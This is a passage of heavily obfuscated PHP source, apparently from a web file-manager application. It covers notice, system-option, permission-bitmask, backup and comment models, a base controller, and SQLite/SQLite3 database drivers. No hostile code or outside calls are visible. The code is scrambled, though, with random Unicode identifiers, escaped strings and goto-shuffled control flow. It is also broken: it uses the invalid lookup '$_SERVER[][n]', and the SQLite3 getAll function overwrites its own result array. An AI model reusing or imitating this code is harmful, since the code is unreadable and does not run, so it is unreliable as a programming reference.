$fȱ[28], $fȱ[197], $fȱ[29], $fȱ[2130], $fȱ[727], $fȱ[189]); } public function userNoticeGet($d⾙ = false) { $this->initUserOption(); return parent::listData($d⾙, $_SERVER[][395], !0); } public function userNoticeAdd($f) { $Bҗ =& $_SERVER[]; $this->initUserOption(); $d = $this->findByKey($Bҗ[2129], $f[$Bҗ[395]]); if ($d) { return !0; } $f = array($Bҗ[2129] => $f[$Bҗ[395]], $Bҗ[28] => $f[$Bҗ[28]], $Bҗ[197] => $f[$Bҗ[197]], $Bҗ[29] => isset($f[$Bҗ[29]]) ? $f[$Bҗ[29]] : 1, $Bҗ[2130] => isset($f[$Bҗ[2130]]) ? $f[$Bҗ[2130]] : 0, $Bҗ[727] => 0, $Bҗ[189] => 0); return parent::insert($f); } public function userNoticeEdit($A, $Eר) { $this->initUserOption(); return parent::update($A, $Eר); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\145\155\137\x6f\x70\x74\x69\x6f\x6e"; protected $jsonField = array("\x6d\145\156\x75", "\x72\157\154\x65", "\162\157\154\x65\x47\162\x6f\x75\160", "\162\x65\147\x69\163\164", "\145\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($dܿ) { return "\x53\x79\163\x74\145\x6d\x4f\160\164\x69\x6f\x6e\x5f{$dܿ}"; } protected function optionDefault($e = '') { $bᙸ =& $_SERVER[]; if ($e == $bᙸ[33]) { return $GLOBALS[$bᙸ[6]][$bᙸ[379]]; } } } goto F繐; bᮄ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto cۼ; cۼ: $Dփҩ =& $_SERVER[]; global $in, $config; $this->config =& $config; goto FښҬ; FښҬ: $this->in =& $in; $this->values[$Dփҩ[6]] =& $config; $this->values[$Dփҩ[7]] =& $in; goto Aٞڪ; Aٞڪ: $this->tpl = TEMPLATE . MOD . $Dփҩ[8]; $this->_classObjectID = mt_rand(0, 10000); goto C׉; C׉: } public function loadClass($fƂȧ) { if (1 === func_num_args()) { $this->{$fƂȧ} = new $fƂȧ(); } else { $c⽝ = new ReflectionClass($fƂȧ); $Aߔ = func_get_args(); array_shift($Aߔ); $this->{$fƂȧ} = $c⽝->newInstanceArgs($Aߔ); } return $this->{$fƂȧ}; } protected function assign($fՊ, $Aӿ) { $this->values[$fՊ] = $Aӿ; } protected function display($dչ) { ob_end_clean(); extract($this->values); require $this->tpl . $dչ; } } class DbSqliteBase extends Db { public function __construct($E = '') { $eƴ =& $_SERVER[]; if (!extension_loaded($eƴ[9])) { think_exception(think_lang($eƴ[10]) . $eƴ[11]); } if (!empty($E)) { if (!isset($E[$eƴ[12]])) { $E[$eƴ[12]] = 438; } $this->config = $E; if (empty($this->config[$eƴ[13]])) { $this->config[$eƴ[13]] = array(); } } } public function connect($b = '', $Fߛ = 0) { $BɎ =& $_SERVER[]; if (!isset($this->linkID[$Fߛ])) { goto EکϏ; Bڎ: $this->linkID[$Fߛ] = $fٝì($b[$BɎ[17]], $b[$BɎ[12]]); if (!$this->linkID[$Fߛ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto A߈; EکϏ: if (empty($b)) { $b = $this->config; } $cԤǅ = !empty($b[$BɎ[13]][$BɎ[14]]) ? $b[$BɎ[13]][$BɎ[14]] : $this->pconnect; $fٝì = $cԤǅ ? $BɎ[15] : $BɎ[16]; goto Bڎ; A߈: @sqlite_busy_timeout($this->linkID[$Fߛ], 30000); if (1 != think_config($BɎ[18])) { unset($this->config); } goto c權; c權: } return $this->linkID[$Fߛ]; } public function free() { $this->queryID = null; } public function query($D) { goto bҙ; E: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $c÷𐉧 = $this->getAll(); return $c÷𐉧; } goto AΌ; aꤕ: $this->queryStr = $D; if ($this->queryID) { $this->free(); } think_action_status($C[19], 1); goto C; bҙ: $C =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aꤕ; C: think_status($C[20]); $this->queryID = sqlite_query($this->_linkID, $D); $this->debug(); goto E; AΌ: } public function execute($B) { goto aԩ; F: think_status($B[20]); $EƖĳ = sqlite_exec($this->_linkID, $B); $this->debug(); goto a; cƜ: $this->queryStr = $B; if ($this->queryID) { $this->free(); } think_action_status($B[21], 1); goto F; aԩ: $B =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cƜ; a: if (!1 === $EƖĳ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto dܕ; dܕ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $DѲ = sqlite_query($this->_linkID, $_SERVER[][23]); if (!$DѲ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $B = sqlite_query($this->_linkID, $_SERVER[][24]); if (!$B) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Fֈ = array(); if ($this->numRows > 0) { for ($D = 0; $D < $this->numRows; $D++) { $Fֈ[$D] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Fֈ; } public function getFields($Aɑ) { $fЈܑ =& $_SERVER[]; $fꑺ = $this->query($fЈܑ[25] . $Aɑ . $fЈܑ[26]); $Fˌ = array(); if ($fꑺ) { foreach ($fꑺ as $A񓬥 => $f¤) { $Fˌ[$f¤[$fЈܑ[27]]] = array($fЈܑ[28] => $f¤[$fЈܑ[27]], $fЈܑ[29] => $f¤[$fЈܑ[30]], $fЈܑ[31] => (bool) ($f¤[$fЈܑ[32]] === $fЈܑ[33]), $fЈܑ[34] => $f¤[$fЈܑ[35]], $fЈܑ[36] => strtolower($f¤[$fЈܑ[37]]) == $fЈܑ[38], $fЈܑ[39] => strtolower($f¤[$fЈܑ[40]]) == $fЈܑ[41]); } } return $Fˌ; } public function getTables($AЗ = '') { $A߅ =& $_SERVER[]; $D = $this->query($A߅[42] . $A߅[43] . $A߅[44]); $AҞ = array(); foreach ($D as $A => $F۬) { $AҞ[$A] = current($F۬); } return $AҞ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $c =& $_SERVER[]; $EɂӲ = sqlite_last_error($this->_linkID); $this->error = $EɂӲ . $c[4] . sqlite_error_string($EɂӲ); if ($c[33] != $this->queryStr) { $this->error .= LNG($c[45]) . $this->queryStr; } think_trace($this->error, $c[33], $c[46]); return $this->error; } public function escapeString($Aв) { return sqlite_escape_string($Aв); } public function parseLimit($f⏱) { $aѤ =& $_SERVER[]; $aӯ = $aѤ[33]; if (!empty($f⏱)) { $f⏱ = explode($aѤ[47], $f⏱); if (count($f⏱) > 1) { $aӯ .= $aѤ[48] . $f⏱[1] . $aѤ[49] . $f⏱[0] . $aѤ[50]; } else { $aӯ .= $aѤ[48] . $f⏱[0] . $aѤ[50]; } } return $aӯ; } } class DbSqlite3Base extends Db { public function __construct($f = '') { $eջƚ =& $_SERVER[]; if (!class_exists($eջƚ[51])) { think_exception(think_lang($eջƚ[10]) . $eջƚ[52]); } if (!empty($f)) { if (!isset($f[$eջƚ[12]])) { $f[$eջƚ[12]] = 438; } $this->config = $f; if (empty($this->config[$eջƚ[13]])) { $this->config[$eջƚ[13]] = array(); } } } public function connect($f = '', $c = 0) { $EɆՋ =& $_SERVER[]; if (!isset($this->linkID[$c])) { if (empty($f)) { $f = $this->config; } $this->linkID[$c] = new SQLite3($f[$EɆՋ[17]]); if (!$this->linkID[$c]) { think_exception($this->linkID[$c]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$c]->busyTimeout(30000); if (1 != think_config($EɆՋ[18])) { unset($this->config); } } return $this->linkID[$c]; } public function free() { $this->queryID = null; } public function query($b䏐) { goto d냰핞; E҆谢: think_status($bΫ[20]); $this->queryID = $this->_linkID->query($b䏐); $this->debug(); goto EߏՖ; d냰핞: $bΫ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto fË; EߏՖ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $Dմ = $this->getAll(); $this->numRows = count($Dմ); return $Dմ; } goto Aޘ; fË: $this->queryStr = $b䏐; if ($this->queryID) { $this->free(); } think_action_status($bΫ[19], 1); goto E҆谢; Aޘ: } public function execute($C) { goto c; Bۂņ: think_status($A୚[20]); $A̾ = $this->_linkID->exec($C); $this->debug(); goto A; A: if (!1 === $A̾) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto D; B: $this->queryStr = $C; if ($this->queryID) { $this->free(); } think_action_status($A୚[21], 1); goto Bۂņ; c: $A୚ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B; D: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F = $this->_linkID->query($_SERVER[][23]); if (!$F) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $A蹍 = $this->_linkID->query($_SERVER[][24]); if (!$A蹍) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $D = array(); while ($D = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $D[] = $D; } $this->queryID->reset(); return $D; } public function getFields($e悷Ͻ) { $Bԑ =& $_SERVER[]; $Eʂ = $this->query($Bԑ[25] . $e悷Ͻ . $Bԑ[26]); $b = array(); if ($Eʂ) { foreach ($Eʂ as $cބΘ => $aʮ) { $b[$aʮ[$Bԑ[28]]] = array($Bԑ[28] => $aʮ[$Bԑ[28]], $Bԑ[29] => $aʮ[$Bԑ[29]], $Bԑ[31] => (bool) ($aʮ[$Bԑ[31]] === $Bԑ[33]), $Bԑ[34] => $aʮ[$Bԑ[53]], $Bԑ[36] => (bool) $aʮ[$Bԑ[54]], $Bԑ[39] => (bool) $aʮ[$Bԑ[54]]); } } return $b; } public function getTables($Aą = '') { $b =& $_SERVER[]; $D = $this->query($b[42] . $b[43] . $b[44]); $F = array(); foreach ($D as $Eڣɚ => $a) { $F[$Eڣɚ] = current($a); } return $F; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $fН =& $_SERVER[]; $this->error = $this->_linkID->lastErrorMsg(); if ($fН[33] != $this->queryStr) { $this->error .= LNG($fН[45]) . $this->queryStr; } think_trace($this->error, $fН[33], $fН[46]); return $this->error; } public function escapeString($a³ऋԇ) { $eù =& $_SERVER[]; if ($this->_linkID) { return $this->_linkID->escapeString($a³ऋԇ); } return str_ireplace($eù[55], $eù[56], $a³ऋԇ); } public function parseLimit($DԊ⴫) { $b =& $_SERVER[]; $e = $b[33]; if (!empty($DԊ⴫)) { $DԊ⴫ = explode($b[47], $DԊ⴫); if (count($DԊ⴫) > 1) { $e .= $b[48] . $DԊ⴫[1] . $b[49] . $DԊ⴫[0] . $b[50]; } else { $e .= $b[48] . $DԊ⴫[0] . $b[50]; } } return $e; } } goto C; F刴: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $A =& $_SERVER[]; $b􇢰 = array(array($A[415] => LNG($A[1716]), $A[1717] => $A[1718], $A[1719] => 1, $A[1720] => 1, $A[1721] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($A[415] => LNG($A[1722]), $A[1717] => $A[1723], $A[1719] => 2, $A[1720] => 1, $A[1721] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($A[415] => LNG($A[1724]), $A[1717] => $A[1725], $A[1719] => 3, $A[1720] => 1, $A[1721] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($A[415] => LNG($A[1726]), $A[1717] => $A[1727], $A[1719] => 4, $A[1720] => 1, $A[1721] => self::AUTH_SHOW | self::AUTH_VIEW), array($A[415] => LNG($A[1728]), $A[1717] => $A[1729], $A[1719] => 5, $A[1720] => 1, $A[1721] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($A[415] => LNG($A[1730]), $A[1717] => $A[1731], $A[1719] => 6, $A[1720] => 1, $A[1721] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($A[415] => LNG($A[1732]), $A[1717] => $A[1733], $A[1719] => 7, $A[1720] => 1, $A[1721] => 0)); return $b􇢰; } public static function authCheck($Dѣύ, $b쉇) { $Dѣύ = intval($Dѣύ); if ($GLOBALS[$_SERVER[][499]]) { return !0; } if ($Dѣύ <= 0) { return !1; } if (($Dѣύ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Dѣύ & $b쉇); } public static function authCheckShow($Bֵ֓) { return self::authCheck($Bֵ֓, self::AUTH_SHOW); } public static function authCheckView($B䡫) { return self::authCheck($B䡫, self::AUTH_VIEW); } public static function authCheckDownload($AƐى) { return self::authCheck($AƐى, self::AUTH_DOWNLOAD); } public static function authCheckUpload($a˧) { return self::authCheck($a˧, self::AUTH_UPLOAD); } public static function authCheckEdit($c) { return self::authCheck($c, self::AUTH_EDIT); } public static function authCheckRemove($Cӷ) { return self::authCheck($Cӷ, self::AUTH_REMOVE); } public static function authCheckShare($B) { return self::authCheck($B, self::AUTH_SHARE); } public static function authCheckComment($f۠) { return self::authCheck($f۠, self::AUTH_COMMENT); } public static function authCheckEvent($d) { return self::authCheck($d, self::AUTH_EVENT); } public static function authCheckRoot($Dƺ) { return self::authCheck($Dƺ, self::AUTH_ROOT); } public static function authCheckAction($C, $e˟) { goto Dɽ; Dɽ: $b =& $_SERVER[]; $B󭌩 = array($b[1734] => self::AUTH_VIEW, $b[1111] => self::AUTH_DOWNLOAD, $b[107] => self::AUTH_UPLOAD, $b[1682] => self::AUTH_EDIT, $b[1681] => self::AUTH_REMOVE, $b[1692] => self::AUTH_SHARE, $b[352] => self::AUTH_COMMENT, $b[1534] => self::AUTH_EVENT, $b[1735] => self::AUTH_ROOT); if (!isset($B󭌩[$e˟])) { return; } goto d; bҋ: if (($C & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($C & $d֎ݼ); goto a􈥌; d: $d֎ݼ = $B󭌩[$e˟]; $C = intval($C); if ($C <= 0) { return !1; } goto bҋ; a􈥌: } public static function authDisable($dԏن, $AՃ) { if (intval($dԏن) <= 0) { return 0; } return intval($dԏن) & ~$AՃ; } public $optionType = "\x53\171\163\x74\x65\x6d\x2e\x73\x6f\x75\162\x63\x65\101\165\x74\150\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\141\165\x74\150", "\154\x61\142\145\154", "\x64\x69\163\x70\154\141\x79", "\163\171\x73\x74\145\x6d", "\x73\x6f\162\x74"); public function initData() { $aɬ = $this->authDefault(); foreach ($aɬ as $A) { $this->add($A); } } public function findAuth($eʪ, $Eڸ) { $FӲ㹚 =& $_SERVER[]; $f = parent::listData(); foreach ($f as $c) { $cǙ = intval($c[$FӲ㹚[408]]); if ($cǙ <= 0 || $c[$FӲ㹚[1736]] == 0) { continue; } if (($cǙ & $eʪ) != $eʪ) { continue; } if (($cǙ & $Eڸ) != 0) { continue; } return $c[$FӲ㹚[395]]; } return !1; } public function findAuthReadOnly() { $CΰП = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $e猪 = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($CΰП, $e猪); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($eܵ = false, $e֍ = "\163\157\x72\x74", $dַ = false) { return parent::listData($eܵ, $e֍, $dַ); } public function update($E, $EⳐ) { $Aӫ =& $_SERVER[]; $EܗԞ = parent::listData($E); $Dʐ۱ = $this->findByName($EⳐ[$Aӫ[28]]); if (!$EܗԞ || $Dʐ۱ && $Dʐ۱[$Aӫ[395]] != $EܗԞ[$Aӫ[395]]) { return !1; } $this->filterAuth($EⳐ[$Aӫ[408]]); return parent::update($E, $EⳐ); } public function remove($a) { $Aȸ޼ = parent::listData($a); if (!$Aȸ޼ || $Aȸ޼[$_SERVER[][1188]]) { return !1; } return parent::remove($a); } public function add($bסϐ = array()) { goto Dŕ떬; Dŕ떬: $E =& $_SERVER[]; if ($this->findByName($bסϐ[$E[28]])) { return !1; } $f׆я = array($E[28] => $E[33], $E[408] => 1, $E[1737] => $E[1725], $E[1736] => 1, $E[1188] => 0, $E[1738] => 0); goto f呶; Eӯ: return parent::insert($bסϐ); goto f윩; f呶: $bסϐ = array_merge($f׆я, $bסϐ); $bסϐ[$E[1738]] = $this->getSort(); $this->filterAuth($bסϐ[$E[408]]); goto Eӯ; f윩: } private function getSort() { $C祋 =& $_SERVER[]; $D = parent::listData(); $cښ = array_to_keyvalue($D, $C祋[33], $C祋[1738]); return empty($cښ) ? 0 : max($cښ) + 1; } private function filterAuth(&$cے) { goto eկ; cǐ: foreach ($Aؑ as $E؊) { if (isset($D還[$E؊])) { $Aؑ = array_merge($Aؑ, $D還[$E؊]); } } $Aؑ[] = self::AUTH_SHOW; $cے = array_sum(array_unique($Aؑ)); goto dڵ; eկ: if (!$cے) { return; } $eλƔ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Aؑ = array(); goto E嵊; E嵊: foreach ($eλƔ as $E؊) { if ($cے & $E؊) { $Aؑ[] = $E؊; } } if (in_array(self::AUTH_ROOT, $Aؑ)) { $cے = array_sum($eλƔ); return; } $D還 = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto cǐ; dڵ: } public function sort($Bի̘, $cÃ) { return parent::update($Bի̘, $cÃ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\56\x62\141\x63\x6b\165\160\x4c\x69\163\164"; public $field = array("\151\x6f", "\x6e\141\x6d\145", "\x73\164\141\x74\165\x73", "\x63\157\x6e\164\145\156\164", "\x6d\141\156\x75\141\x6c", "\x72\145\x73\x75\154\x74", "\x74\x69\155\x65\x46\x72\157\155", "\x74\x69\x6d\x65\124\157"); public function config() { goto Aᾈ; Bȅ: $Eɖ = Model($aı۫[1741])->findByKey($aı۫[1534], $Aᯄ); if (!$Eɖ) { $Eɖ = array(); } if (isset($Eɖ[$aı۫[197]])) { $Eɖ[$aı۫[197]] = json_decode($Eɖ[$aı۫[197]], !0); } goto DӬ; Aᾈ: $aı۫ =& $_SERVER[]; $Dż = Model($aı۫[747])->get($aı۫[759]); $Dż = json_decode($Dż, !0); goto e; e: $Dż = is_array($Dż) ? $Dż : array(); if (!isset($Dż[$aı۫[732]])) { $Dż[$aı۫[732]] = $aı۫[87]; } unset($Dż[$aı۫[1516]]); goto Dˇ; Dˇ: Action($aı۫[1739])->taskInit(); Model($aı۫[1515])->cacheClear(); $Aᯄ = $aı۫[1740]; goto Bȅ; DӬ: if (isset($Dż[$aı۫[197]])) { $Eɖ[$aı۫[197]][$aı۫[1519]] = $Dż[$aı۫[197]]; unset($Dż[$aı۫[197]]); } return array_merge($Eɖ, $Dż); goto B; B: } public function listData($AԂ = false, $b = "\155\157\x64\151\x66\x79\x54\x69\x6d\145", $d = false) { return parent::listData($AԂ, $b, !0); } public function lastItem() { $E獌Ą = $this->listData(); return !empty($E獌Ą[0]) ? $E獌Ą[0] : null; } public function kill($Fي⋼) { goto dޓ; Aͅ: $B􇹵 = $Bň۠[$f功[28]]; $fȨ = TEMP_FILES . $f功[755] . $B􇹵 . $f功[8]; IO::remove($fȨ, !1); goto FӾ̤̭; fΨ: Task::kill($f功[758]); Task::kill($f功[783]); Task::kill($f功[793]); goto Aͅ; dޓ: $f功 =& $_SERVER[]; $Bň۠ = $this->listData($Fي⋼); if (!$Bň۠ || empty($Bň۠[$f功[28]])) { return !0; } goto fΨ; FӾ̤̭: return $this->remove($Fي⋼); goto Aۻ; Aۻ: } public function remove($e) { $e狙ϩ = $this->listData($e); if (!$e狙ϩ) { return !0; } return $this->backupRemove($e狙ϩ); } private function backupRemove($E) { parent::remove($E[$_SERVER[][395]]); $Bǿ = $this->backupPath($E); IO::remove($Bǿ, !1); return !0; } private function backupPath($D؍) { $B =& $_SERVER[]; $Fͭ⌽ = $D؍[$B[28]]; $a╨ = Model($B[747])->get($B[748]); $fȷ = substr(md5($B[749] . $a╨ . $Fͭ⌽), 0, 8); return "\173\x69\x6f\x3a{$D؍[$B[729]]}\175\x2f\144\x61\x74\x61\x62\x61\163\145\57\x62\x61\x63\153\165\160\57" . $Fͭ⌽ . $B[71] . $fȷ; } public function start() { goto Bⅿ; Aݚ: if (!$d𵞬 || $d𵞬[$d󟘍[1516]] != $d󟘍[87]) { return !1; } $f = $this->process(); foreach ($f as $b儻) { if ($b儻) { return Task::restart($b儻[$d󟘍[395]]); } } goto Eܜɵ; Bⅿ: $d󟘍 =& $_SERVER[]; if ($GLOBALS[$d󟘍[6]][$d󟘍[88]][$d󟘍[1742]] != $d󟘍[87]) { return !0; } $d𵞬 = $this->config(); goto Aݚ; Eܜɵ: $F֢ = new Backup(); $A = $F֢->db(); if ($A) { $A = $F֢->dbFile(); if ($A && $d𵞬[$d󟘍[732]] == $d󟘍[191]) { $A = $F֢->file(); } } goto A; A: Backup::set(array($d󟘍[727] => 1, $d󟘍[490] => time())); return !0; goto d඲; d඲: } public function process() { $AΧ֎ =& $_SERVER[]; return array($AΧ֎[735] => Task::get($AΧ֎[758]), $AΧ֎[739] => Task::get($AΧ֎[783]), $AΧ֎[193] => Task::get($AΧ֎[793])); } public function restore() { $B =& $_SERVER[]; ActionCall($B[1036], !0, 1); ActionCall($B[1036], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\145\156\164"; protected $tableMeta = array("\164\x61\x62\154\x65\116\x61\x6d\145" => "\143\x6f\x6d\x6d\145\x6e\x74\137\x6d\145\164\141", "\x6d\145\164\x61\106\151\x65\x6c\x64" => "\143\x6f\x6d\155\145\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($fۜ) { $Dؚ =& $_SERVER[]; if ($fۜ[$Dؚ[1743]]) { $BȌ͂ = $this->where(array($Dؚ[1744] => $fۜ[$Dؚ[1743]]))->find(); if (!$BȌ͂ || $BȌ͂[$Dؚ[406]] != $fۜ[$Dؚ[406]] || $BȌ͂[$Dؚ[498]] != $fۜ[$Dؚ[498]]) { return !1; } $this->where(array($Dؚ[1744] => $fۜ[$Dؚ[1743]]))->setAdd($Dؚ[1745], 1); } $fۜ[$Dؚ[1746]] = 0; $fۜ[$Dؚ[1745]] = 0; $fۜ[$Dؚ[727]] = 1; return $this->add($fۜ); } public function commentCount($aᢾ, $aԍƿ, $aЏ = false) { goto fﾑ; fܞ: $aᱠ = array($f[498], $f[1747] => $f[494]); $Fբߙ = array($f[498] => array($f[7], $aᢾ), $f[406] => $aԍƿ); if ($aЏ) { $Fբߙ[$f[1546]] = $aЏ; } goto c; fﾑ: $f =& $_SERVER[]; if (!$aᢾ) { return array(); } if (is_string($aᢾ) || is_int($aᢾ)) { $aᢾ = array($aᢾ); } goto fܞ; c: $B➜ = $this->field($aᱠ)->where($Fբߙ)->group($f[498])->select(); return array_to_keyvalue($B➜, $f[498], $f[494]); goto E; E: } public function starTarget($Fι, $a) { goto e׋; CӐޮ: return $this->add($C屇¤); goto c됂; C: $FӇ = $this->where($c)->find(); if ($FӇ) { return $this->where(array($fԎт[395] => $FӇ[$fԎт[395]]))->delete(); } $C屇¤ = array($fԎт[1743] => 0, $fԎт[1546] => USER_ID, $fԎт[727] => 1, $fԎт[732] => $fԎт[33], $fԎт[406] => $B␻ݚ, $fԎт[498] => $a, $fԎт[1746] => 0, $fԎт[1745] => 0); goto CӐޮ; e׋: $fԎт =& $_SERVER[]; $B␻ݚ = $Fι + self::TYPE_STAR_OFFSET; $c = array($fԎт[1546] => USER_ID, $fԎт[406] => $B␻ݚ, $fԎт[498] => $a); goto C; c됂: } public function starTargetCount($aк, $Dȏ) { $EВ =& $_SERVER[]; $f󢃆 = $Dȏ + self::TYPE_STAR_OFFSET; $Bؗ = $this->commentCount($aк, $f󢃆); $dԦ㱴ۗ = $this->commentCount($aк, $f󢃆, USER_ID); return array($EВ[1748] => $Bؗ, $EВ[1749] => $dԦ㱴ۗ); } public function starTargetUserList($dֿǈ, $Cº) { goto CՇ; d: $e⭞ = $this->field($eط[1546])->where($A޺ɉ)->limit(500)->select(); $e⭞ = array_to_keyvalue($e⭞, $eط[33], $eط[1546]); $b[$eط[1750]] = Model($eط[507])->userListInfo($e⭞); goto aῘ; aῘ: return $b; goto b; CՇ: $eط =& $_SERVER[]; $Aκ = $dֿǈ + self::TYPE_STAR_OFFSET; $A޺ɉ = array($eط[498] => $Cº, $eط[406] => $Aκ); goto f򪐼; f򪐼: $c = $this->where($A޺ɉ)->count(); $b = array($eط[253] => $c, $eط[1750] => array()); if (!$c) { return $b; } goto d; b: } public function prasiseUserList($FƓ쌊) { goto C봱; Fܼг: $Dԥ = _get($Dԓ, $E߂ڶ[1746], 0); $dٸ = array($E߂ڶ[253] => $Dԥ, $E߂ڶ[1750] => array()); if (!$Dԥ) { return $dٸ; } goto d; aܾ: return $dٸ; goto f; C봱: $E߂ڶ =& $_SERVER[]; $D֨٩ = array($E߂ڶ[1751] => $FƓ쌊); $Dԓ = $this->where($D֨٩)->find(); goto Fܼг; d: $dӂ = Model($E߂ڶ[1752])->field($E߂ڶ[1546])->where($D֨٩)->limit(500)->select(); $dӂ = array_to_keyvalue($dӂ, $E߂ڶ[33], $E߂ڶ[1546]); $dٸ[$E߂ڶ[1750]] = Model($E߂ڶ[507])->userListInfo($dӂ); goto aܾ; f: } public function remove($b軿) { $A֢勤 =& $_SERVER[]; $dϻܐ = array($A֢勤[1744] => $b軿); $eʯ = $this->where($dϻܐ)->find(); if ($eʯ[$A֢勤[1743]]) { $this->where(array($A֢勤[1744] => $eʯ[$A֢勤[1743]]))->setAdd($A֢勤[1745], -1); } return $this->where($dϻܐ)->delete(); } public function edit($Cۍ繧, $Dč) { $c =& $_SERVER[]; $D = array($c[1744] => $Cۍ繧); return $this->where($D)->save(array($c[1753] => $Dč)); } public function prasise($C) { $E㏲ =& $_SERVER[]; $C = Model($E㏲[1754]); $f = array($E㏲[1744] => $C, $E㏲[1537] => USER_ID); $F˓ = $C->where($f)->find(); if (!$F˓) { $C->add($f); $a = $this->where(array($E㏲[1744] => $C))->setAdd($E㏲[1746], 1); } else { $C->where($f)->delete(); $a = $this->where(array($E㏲[1744] => $C))->setAdd($E㏲[1746], -1); } return $a; } public function targetInfo($Cҡ, $f⚠) { goto fۯ; fۯ: $D =& $_SERVER[]; $aᣚʓ = array($D[574] => $Cҡ, $D[575] => $f⚠); $A毌˱ = $this->where($aᣚʓ)->count(); goto aش; dŹ: return $f; goto bȜ; aش: $Fъ = "\122\x49\107\x48\x54\40\x4a\117\x49\116\40{$this->tablePrefix}\x63\157\x6d\x6d\145\156\x74\x5f\160\162\x61\151\x73\x65\40\163\164\141\x72\40\x6f\x6e\40\x63\157\x6d\155\x65\156\164\x2e\x63\157\155\155\145\156\x74\x49\104\40\75\40\x73\x74\x61\162\56\143\157\155\155\x65\x6e\164\x49\104"; $E틆 = $this->alias($D[352])->where($aᣚʓ)->join($Fъ, $D[1755])->count(); $f = array($D[1756] => $A毌˱, $D[1757] => $E틆); goto dŹ; bȜ: } public function listData($fܧ) { $Eђ֧ =& $_SERVER[]; if (isset($fܧ[$Eђ֧[1758]])) { if ($fܧ[$Eђ֧[1758]]) { $fܧ[$Eђ֧[1751]] = array($Eђ֧[990], intval($fܧ[$Eђ֧[1758]])); } unset($fܧ[$Eђ֧[1758]]); } if 